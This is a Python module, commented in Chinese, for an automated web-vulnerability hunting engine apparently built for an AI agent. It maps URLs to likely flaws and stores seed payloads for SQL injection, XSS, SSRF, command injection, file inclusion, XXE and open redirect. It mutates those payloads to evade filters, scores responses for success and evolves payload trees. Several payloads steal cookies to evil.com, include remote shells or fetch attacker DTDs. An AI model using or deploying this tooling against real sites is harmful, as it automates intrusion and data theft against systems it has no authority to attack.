#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
漏洞挖掘进化引擎 · 纯函数内核（stdlib-only，Hermes Agent 可直接 import）

实现 V1~V4：
  V1 漏洞面枚举：从目标 URL/描述映射漏洞类型
  V2 Payload 生成 + SCAMPER 变异：模板库 + 7 种变异操作
  V3 响应判定：按漏洞类型判定成功/证据/置信度
  V4 树形 Payload 进化：分支扩展 + 血统继承 + 冠军反哺

全部纯函数，可离线单测，fail-open。

用法：
  from vuln_hunter_kernel import enumerate_surfaces, payload_seeds, scamper_mutate, judge_response

  surfaces = enumerate_surfaces("https://target.com/login.php?id=1")
  seeds = payload_seeds("sqli")
  variants = scamper_mutate("' OR '1'='1", "sqli")
  result = judge_response("SQL syntax error near '1'", "sqli")
"""
from __future__ import annotations

import hashlib
import json
import re
import sys
import urllib.parse
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple


# ===========================================================================
# V1: 漏洞面枚举
# ===========================================================================

# 漏洞类型 → 触发特征（URL 关键字 / 页面特征）
_VULN_SIGNATURES: List[Tuple[str, str, float, List[str]]] = [
    # (漏洞类型, 匹配模式, 置信度, 触发特征列表)
    ("sqli", "sqli", 0.9, [
        r"\?id=\d+", r"\?page=\d+", r"\?user=\d+", r"\?product=\d+",
        r"\?cat=\d+", r"\?article=\d+", r"\?newsid=", r"\.php\?",
        r"search\?", r"query=", r"filter=",
    ]),
    ("xss_reflected", "xss_reflected", 0.85, [
        r"<form", r"search", r"comment", r"message", r"feedback",
        r"q=", r"query=", r"name=", r"email=", r"input",
    ]),
    ("xss_stored", "xss_stored", 0.75, [
        r"profile", r"comment", r"post", r"review", r"message",
        r"signup", r"register", r"forum",
    ]),
    ("xss_dom", "xss_dom", 0.70, [
        r"#", r"document\.", r"location\.", r"innerHTML",
        r"eval\(.*location", r"setTimeout\(.*location",
    ]),
    ("csrf", "csrf", 0.80, [
        r"<form", r"submit", r"transfer", r"payment",
        r"settings", r"password.change", r"email.change",
    ]),
    ("ssrf", "ssrf", 0.80, [
        r"url=", r"redirect=", r"callback=", r"webhook=",
        r"proxy=", r"fetch=", r"api", r"file=", r"path=",
    ]),
    ("cmdi", "cmdi", 0.75, [
        r"cmd=", r"exec=", r"command=", r"ping", r"host=",
        r"ip=", r"target=", r"domain=", r"nslookup",
    ]),
    ("path_traversal", "path_traversal", 0.75, [
        r"file=", r"path=", r"folder=", r"download=",
        r"read=", r"include=", r"template=", r"page=",
    ]),
    ("file_upload", "file_upload", 0.85, [
        r"upload", r"file", r"avatar", r"photo", r"image",
        r"import", r"attachment",
    ]),
    ("idor", "idor", 0.75, [
        r"user=\d+", r"id=\d+", r"profile=\d+", r"account=\d+",
        r"order=\d+", r"doc=\d+", r"invoice=",
    ]),
    ("auth_bypass", "auth_bypass", 0.80, [
        r"login", r"auth", r"signin", r"admin", r"dashboard",
        r"forgot", r"reset", r"token=",
    ]),
    ("lfi", "lfi", 0.70, [
        r"file=", r"include=", r"template=", r"lang=",
        r"locale=", r"page=", r"view=",
    ]),
    ("rfi", "rfi", 0.65, [
        r"url=", r"include=", r"import=", r"load=",
        r"fetch=", r"remote=",
    ]),
    ("xxe", "xxe", 0.70, [
        r"xml", r"soap", r"api", r"rss", r"atom",
        r"import", r"upload.*xml",
    ]),
    ("open_redirect", "open_redirect", 0.85, [
        r"redirect=", r"url=", r"next=", r"return=",
        r"goto=", r"callback=", r"target=",
    ]),
]


def enumerate_surfaces(target: str) -> List[Dict]:
    """V1 纯函数：从目标 URL/描述枚举可能的漏洞面。

    Returns:
        List[{"vuln_type": str, "confidence": float, "reasons": [str]}]
    """
    try:
        lowered = target.lower()
        surfaces: List[Dict] = []
        seen = set()
        for vuln_type, type_id, base_conf, patterns in _VULN_SIGNATURES:
            if type_id in seen:
                continue
            matched = []
            for pat in patterns:
                if re.search(pat, lowered):
                    matched.append(pat)
            if matched:
                # 每多匹配一个特征，置信度微调
                boost = min(0.10, (len(matched) - 1) * 0.03)
                surfaces.append({
                    "vuln_type": vuln_type,
                    "confidence": min(1.0, base_conf + boost),
                    "reasons": matched,
                })
                seen.add(type_id)
        return surfaces
    except Exception:
        return []


# ===========================================================================
# V2: Payload 模板库 + SCAMPER 变异
# ===========================================================================

_PAYLOAD_SEEDS: Dict[str, List[str]] = {
    "sqli": [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT username,password FROM users--",
        "' AND 1=1--",
        "' AND 1=2--",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "'; WAITFOR DELAY '0:0:5'--",
        "1 AND SLEEP(5)",
        "1' AND SLEEP(5)--",
        "' OR 1=1#",
        '" OR 1=1--',
        "admin'--",
        "admin' #",
    ],
    "xss_reflected": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        '"><svg/onload=alert(1)>',
        "javascript:alert(1)",
        "<body onload=alert(1)>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "<img src=x onerror=alert`1`>",
        '"><img src=x onerror=prompt(1)>',
        "'-alert(1)-'",
        "\"-alert(1)-\"",
    ],
    "xss_stored": [
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=fetch('http://evil.com?c='+document.cookie)>",
        "<svg/onload=eval(atob('YWxlcnQoMSk='))>",
        "<body onload=document.write('<img src=http://evil.com?c='+document.cookie+'>')>",
    ],
    "xss_dom": [
        "#<img src=x onerror=alert(1)>",
        "#javascript:alert(1)",
        "');alert(1)//",
        '");alert(1)//',
        "test\"-alert(1)-\"",
    ],
    "ssrf": [
        "http://127.0.0.1:8080/",
        "http://localhost/admin",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "http://[::1]:80/",
        "http://0.0.0.0/",
        "http://2130706433/",
        "gopher://127.0.0.1:6379/_INFO",
    ],
    "cmdi": [
        "; id",
        "| whoami",
        "`id`",
        "$(whoami)",
        "& ping -c 5 127.0.0.1 &",
        "&& dir",
        "| cat /etc/passwd",
        "; uname -a",
        "%0a id",
        "| nslookup evil.com",
    ],
    "path_traversal": [
        "../../etc/passwd",
        "..\\..\\windows\\win.ini",
        "....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..\\/..\\/..\\/etc/passwd",
        "/etc/passwd",
        "C:\\windows\\win.ini",
    ],
    "file_upload": [
        "shell.php",
        "shell.php.jpg",
        "shell.pHp",
        "shell.php%00.jpg",
        "shell.php .jpg",
        "shell.php;.jpg",
        ".htaccess",
        "shell.phtml",
        "shell.php5",
    ],
    "idor": [
        "1", "2", "0", "admin", "root",
        "-1", "999999", "' OR '1'='1",
    ],
    "auth_bypass": [
        "admin'--",
        "admin' #",
        "' OR '1'='1' --",
        "' UNION SELECT 1,'admin','password'--",
        "admin' OR '1'='1",
        "administrator'--",
    ],
    "lfi": [
        "../../etc/passwd",
        "....//....//etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
        "expect://id",
        "/proc/self/environ",
    ],
    "rfi": [
        "http://evil.com/shell.txt",
        "https://evil.com/shell.php",
        "ftp://evil.com/shell.txt",
        "\\\\evil.com\\share\\shell.txt",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd"> %xxe;]><foo>&exfil;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
    ],
    "csrf": [
        # CSRF 不依赖 Payload 文本，而是靠"无 token/无 referer"判定
        "_csrf_test_no_token",
    ],
    "open_redirect": [
        "https://evil.com",
        "//evil.com",
        "https:evil.com",
        "\\\\evil.com",
        "https://evil.com%23.target.com",
        "https://evil.com/.target.com",
        "javascript:alert(1)",
    ],
}


def payload_seeds(vuln_type: str) -> List[str]:
    """V2 纯函数：返回指定漏洞类型的种子 Payload 列表。"""
    try:
        return _PAYLOAD_SEEDS.get(vuln_type, [])
    except Exception:
        return []


# ---- SCAMPER 变异引擎 ----

def _url_encode(payload: str) -> str:
    return "".join(f"%{ord(c):02X}" if c in "'\"<>;|&`()[]{} " else c for c in payload)

def _html_entity_encode(payload: str) -> str:
    return payload.replace("<", "&lt;").replace(">", "&gt;").replace("'", "&#x27;").replace('"', "&quot;")

def _case_vary(payload: str) -> str:
    return "".join(c.upper() if i % 2 == 1 else c.lower() for i, c in enumerate(payload))

def _double_write(payload: str) -> str:
    """双写绕过 WAF：OR → OORR"""
    result = payload
    for keyword in ("OR", "AND", "SELECT", "UNION", "INSERT", "DELETE", "DROP", "EXEC", "SCRIPT"):
        if keyword in payload.upper():
            idx = payload.upper().find(keyword)
            result = payload[:idx] + payload[idx] + payload[idx:idx+len(keyword)] + payload[idx+len(keyword):]
    return result

def _comment_split(payload: str) -> str:
    """注释分割绕过：SELECT → SEL/**/ECT"""
    if len(payload) > 3:
        mid = len(payload) // 2
        return payload[:mid] + "/**/" + payload[mid:]
    return payload

def _whitespace_eliminate(payload: str) -> str:
    """去空格：' OR 1=1 → 'OR'1'='1"""
    return payload.replace(" ", "")

def _encoding_layer(payload: str, vuln_type: str) -> str:
    """按漏洞类型选择编码策略"""
    if vuln_type in ("sqli",):
        return _url_encode(payload)
    elif vuln_type.startswith("xss"):
        return _html_entity_encode(payload)
    return payload

def _reverse_quote(payload: str) -> str:
    """单双引号互换"""
    return payload.replace("'", "\x00").replace('"', "'").replace("\x00", '"')

def _prefix_vary(payload: str) -> str:
    """前缀变换"""
    prefixes = ["", " ", "\t", "\n", "+", "%0a", "%0d%0a", "/**/"]
    return prefixes[hash(payload) % len(prefixes)] + payload


SCAMPER_OPS = {
    "substitute": _reverse_quote,           # 替换：单引号变双引号
    "combine": lambda p: p + "/**/" + p,    # 组合：自拼接
    "adapt": _encoding_layer,               # 适配：编码
    "modify": _double_write,                # 变形：双写
    "put_other": _comment_split,            # 另用：注释分割
    "eliminate": _whitespace_eliminate,     # 精简：去空格
    "reverse": _case_vary,                  # 逆序：大小写变换
}


def scamper_mutate(seed_payload: str, vuln_type: str, ops: Optional[List[str]] = None) -> List[Tuple[str, str]]:
    """V2 纯函数：对种子 Payload 做 SCAMPER 变异。

    Args:
        seed_payload: 种子 Payload 字符串
        vuln_type: 漏洞类型（用于编码策略选择）
        ops: 指定变异操作列表，默认全部 7 种

    Returns:
        List[(变体Payload, 变异操作名)]
    """
    try:
        op_names = ops or list(SCAMPER_OPS.keys())
        variants: List[Tuple[str, str]] = []
        seen = {seed_payload}
        for op_name in op_names:
            if op_name not in SCAMPER_OPS:
                continue
            op_fn = SCAMPER_OPS[op_name]
            try:
                if op_name == "adapt":
                    variant = op_fn(seed_payload, vuln_type)
                else:
                    variant = op_fn(seed_payload)
                if variant and variant != seed_payload and variant not in seen:
                    variants.append((variant, op_name))
                    seen.add(variant)
            except Exception:
                continue
        return variants
    except Exception:
        return []


def mutate_population(seeds: List[str], vuln_type: str, max_variants: int = 24) -> List[Tuple[str, str, Optional[str]]]:
    """V2：对种子种群批量变异，返回去重后的变体列表。

    Returns:
        List[(变体Payload, 变异操作名, 父Payload或None表示根种子)]
    """
    try:
        all_variants: List[Tuple[str, str, Optional[str]]] = []
        seen = set(seeds)
        # 先收录种子
        for s in seeds:
            all_variants.append((s, "seed", None))
        # 再变异
        for seed in seeds:
            variants = scamper_mutate(seed, vuln_type)
            for v, op in variants:
                if v not in seen:
                    all_variants.append((v, op, seed))
                    seen.add(v)
                if len(all_variants) >= max_variants:
                    return all_variants
        return all_variants
    except Exception:
        return [(s, "seed", None) for s in seeds]


# ===========================================================================
# V3: 响应判定
# ===========================================================================

_VULN_PATTERNS: Dict[str, List[Tuple[str, float]]] = {
    "sqli": [
        (r"SQL syntax", 0.95),
        (r"mysql_fetch", 0.90),
        (r"ORA-\d{5}", 0.90),
        (r"PostgreSQL.*ERROR", 0.90),
        (r"Microsoft OLE DB", 0.85),
        (r"Unclosed quotation mark", 0.90),
        (r"Warning.*mysql_", 0.85),
        (r"SQLite3::query", 0.85),
        (r"you have an error in your SQL", 0.95),
        (r"supplied argument is not a valid MySQL", 0.90),
    ],
    "xss_reflected": [
        (r"<script>alert\(1\)</script>", 0.95),
        (r"<img src=x onerror=alert", 0.95),
        (r"<svg/onload=alert", 0.95),
        (r"alert\(document\.cookie\)", 0.90),
    ],
    "xss_stored": [
        (r"<script>", 0.80),
        (r"onerror=", 0.75),
        (r"onload=", 0.75),
    ],
    "ssrf": [
        (r"root:.*:0:0:", 0.95),
        (r"meta-data", 0.90),
        (r"ami-id", 0.90),
        (r"127\.0\.0\.1", 0.70),
        (r"localhost", 0.60),
    ],
    "cmdi": [
        (r"uid=\d+\(.*\)", 0.95),
        (r"root:.*:0:0:", 0.85),
        (r"Windows IP Configuration", 0.80),
        (r"Linux", 0.60),
        (r"uid=", 0.90),
    ],
    "path_traversal": [
        (r"root:.*:0:0:", 0.95),
        (r"\[extensions\]", 0.90),
        (r"daemon:", 0.85),
        (r"nobody:", 0.80),
        (r"bin/bash", 0.80),
    ],
    "lfi": [
        (r"root:.*:0:0:", 0.95),
        (r"<\?php", 0.85),
        (r"PD9waHA", 0.85),  # base64 of <?php
    ],
    "xxe": [
        (r"root:.*:0:0:", 0.95),
        (r"uid=", 0.85),
    ],
    "open_redirect": [
        # 开放重定向靠 URL 比对，不在响应体中判定
    ],
}


def judge_response(response_text: str, vuln_type: str) -> Dict:
    """V3 纯函数：根据响应文本和漏洞类型判定注入是否成功。

    Returns:
        {"success": bool, "evidence": str, "confidence": float}
    """
    try:
        patterns = _VULN_PATTERNS.get(vuln_type, [])
        if not patterns:
            return {"success": False, "evidence": "", "confidence": 0.0}

        best_match = None
        best_confidence = 0.0
        for pattern, confidence in patterns:
            m = re.search(pattern, response_text, re.IGNORECASE)
            if m and confidence > best_confidence:
                best_match = m.group(0)
                best_confidence = confidence

        if best_match:
            return {
                "success": True,
                "evidence": best_match,
                "confidence": best_confidence,
            }
        return {"success": False, "evidence": "", "confidence": 0.0}
    except Exception:
        return {"success": False, "evidence": "", "confidence": 0.0}


# ===========================================================================
# V4: 树形 Payload 进化
# ===========================================================================

@dataclass
class VulnNode:
    """树节点：一个 Payload 及其元数据"""
    payload: str
    vuln_type: str
    variant_op: str = "seed"           # seed / substitute / combine / ...
    parent_payload: Optional[str] = None
    gene_success_rate: float = 0.5     # 血统成功率 0~1
    fitness: float = 0.0               # 适应度 0~100
    depth: int = 0
    verified: bool = False
    children: List["VulnNode"] = field(default_factory=list)
    stale: bool = False


def _sig(payload: str) -> str:
    return hashlib.sha256(payload.encode()).hexdigest()[:12]


def build_tree(
    seeds: List[str],
    vuln_type: str,
    max_depth: int = 3,
    max_children: int = 3,
    max_nodes: int = 48,
    min_fitness: float = 55.0,
    initial_gene_rate: float = 0.5,
) -> VulnNode:
    """V4 纯函数：构建 Payload 进化树。

    Returns:
        根节点（虚拟根），children 为种子节点，每层可 scamper_mutate 扩展
    """
    try:
        root = VulnNode(payload="__ROOT__", vuln_type=vuln_type)
        node_count = 1

        # T1: 种子入树
        for seed in seeds:
            child = VulnNode(
                payload=seed, vuln_type=vuln_type,
                gene_success_rate=initial_gene_rate,
                depth=1,
            )
            root.children.append(child)
            node_count += 1

        # T2: 分支扩展（BFS）
        from collections import deque
        queue = deque(root.children)
        while queue and node_count < max_nodes:
            node = queue.popleft()
            if node.depth >= max_depth or node.stale:
                continue

            # 对每个节点做 SCAMPER 变异
            variants = scamper_mutate(node.payload, vuln_type)
            added = 0
            for variant_payload, op in variants:
                if node_count >= max_nodes:
                    break
                child = VulnNode(
                    payload=variant_payload,
                    vuln_type=vuln_type,
                    variant_op=op,
                    parent_payload=node.payload,
                    gene_success_rate=node.gene_success_rate,  # T2 血统继承
                    depth=node.depth + 1,
                )
                node.children.append(child)
                queue.append(child)
                node_count += 1
                added += 1
                if added >= max_children:
                    break

        return root
    except Exception:
        return VulnNode(payload="__ROOT__", vuln_type=vuln_type)


def tree_frontier(root: VulnNode) -> List[VulnNode]:
    """V4：获取树的生长前沿（未扩展的非 stale 叶节点）"""
    try:
        frontier: List[VulnNode] = []
        def _walk(node: VulnNode):
            if node.stale:
                return
            if not node.children:
                frontier.append(node)
            else:
                for c in node.children:
                    _walk(c)
        for c in root.children:
            _walk(c)
        return frontier
    except Exception:
        return []


def tree_to_flat(root: VulnNode) -> List[VulnNode]:
    """V4：树展平为列表，按 gene_success_rate 降序"""
    try:
        nodes: List[VulnNode] = []
        def _walk(node: VulnNode):
            if node.payload != "__ROOT__" and not node.stale:
                nodes.append(node)
            for c in node.children:
                _walk(c)
        for c in root.children:
            _walk(c)
        nodes.sort(key=lambda n: n.gene_success_rate, reverse=True)
        return nodes
    except Exception:
        return []


def record_outcome(node: VulnNode, success: bool, boost: float = 0.12, penalty: float = 0.10):
    """V4 T3：记录投递结果，沿祖先链血统强化/削弱"""
    try:
        node.verified = True
        delta = boost if success else -penalty
        node.gene_success_rate = max(0.0, min(1.0, node.gene_success_rate + delta))
        node.fitness = node.gene_success_rate * 100.0
        if not success and node.gene_success_rate < 0.3:
            node.stale = True
    except Exception:
        pass


def render_tree(root: VulnNode) -> str:
    """V4 T5：ASCII 树可视化"""
    try:
        lines = []
        def _render(node: VulnNode, prefix: str = "", is_last: bool = True):
            if node.payload == "__ROOT__":
                marker = "[ROOT]"
            else:
                status = "V" if node.verified else ("S" if node.stale else " ")
                marker = f"[{status} {node.gene_success_rate:.2f}] {_sig(node.payload)} {node.payload[:30]}"
            connector = "`-- " if is_last else "|-- "
            lines.append(f"{prefix}{connector}{marker}")
            new_prefix = prefix + ("    " if is_last else "|   ")
            for i, c in enumerate(node.children):
                _render(c, new_prefix, i == len(node.children) - 1)
        lines.append(f"VulnTree [{root.vuln_type}]")
        for i, c in enumerate(root.children):
            _render(c, "", i == len(root.children) - 1)
        return "\n".join(lines)
    except Exception:
        return "[render failed]"


# ===========================================================================
# CLI（演示用）
# ===========================================================================

def main(argv: Optional[List[str]] = None) -> int:
    args = sys.argv[1:] if argv is None else argv
    if not args:
        print("Usage: python vuln_hunter_kernel.py <enumerate|seeds|mutate|judge|tree> [args...]")
        return 0

    try:
        cmd = args[0]
        if cmd == "enumerate":
            target = " ".join(args[1:]) if len(args) > 1 else "https://example.com/login.php?id=1"
            surfaces = enumerate_surfaces(target)
            for s in surfaces:
                print(f"[{s['vuln_type']}] confidence={s['confidence']:.2f} reasons={s['reasons']}")

        elif cmd == "seeds":
            vt = args[1] if len(args) > 1 else "sqli"
            seeds = payload_seeds(vt)
            for s in seeds:
                print(s)

        elif cmd == "mutate":
            payload = args[1] if len(args) > 1 else "' OR '1'='1"
            vt = args[2] if len(args) > 2 else "sqli"
            variants = scamper_mutate(payload, vt)
            for v, op in variants:
                print(f"[{op}] {v}")

        elif cmd == "judge":
            resp = " ".join(args[1:-1]) if len(args) > 2 else "SQL syntax error near '1'"
            vt = args[-1] if len(args) > 1 else "sqli"
            result = judge_response(resp, vt)
            print(json.dumps(result, ensure_ascii=False, indent=2))

        elif cmd == "tree":
            vt = args[1] if len(args) > 1 else "sqli"
            seeds = payload_seeds(vt)[:4]
            root = build_tree(seeds, vt, max_depth=2, max_children=2, max_nodes=24)
            print(render_tree(root))
            flat = tree_to_flat(root)
            print(f"\n{len(flat)} payloads in tree, {len(tree_frontier(root))} frontier nodes")

        elif cmd == "full":
            target = args[1] if len(args) > 1 else "https://example.com/login.php?id=1&q=search"
            print(f"=== V1 漏洞面枚举 ===")
            surfaces = enumerate_surfaces(target)
            for s in surfaces:
                print(f"  [{s['vuln_type']}] conf={s['confidence']:.2f}")

            for s in surfaces[:2]:
                vt = s["vuln_type"]
                seeds = payload_seeds(vt)[:3]
                print(f"\n=== V2/V4 {vt}: {len(seeds)} seeds ===")
                root = build_tree(seeds, vt, max_depth=2, max_children=2, max_nodes=12)
                print(render_tree(root))

        return 0
    except Exception as e:
        print(f"[WARN] {e}", file=sys.stderr)
        return 0


if __name__ == "__main__":
    raise SystemExit(main())
